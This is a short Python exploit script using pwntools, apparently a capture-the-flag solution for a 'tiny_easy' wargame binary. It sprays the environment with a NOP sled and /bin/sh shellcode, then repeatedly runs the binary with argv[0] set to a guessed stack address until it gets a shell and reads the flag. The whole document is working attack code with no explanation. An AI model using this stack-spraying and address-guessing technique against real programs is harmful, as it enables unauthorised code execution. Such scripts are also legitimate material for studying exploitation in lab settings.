from pwn import *
context.arch = 'i386'

shellcode = asm(shellcraft.sh())
payload = b'\x90'*8000 + shellcode
env = {}
for i in range(1, 0x100):
    env[str(i)] = payload
while True:
    p = process([p32(0xffd01d24)], executable='/home/tiny_easy/tiny_easy', env=env)
    try:
        p.sendline('cat flag')
        p.recv()
    except:
        # print('error')
        continue
    break
p.interactive()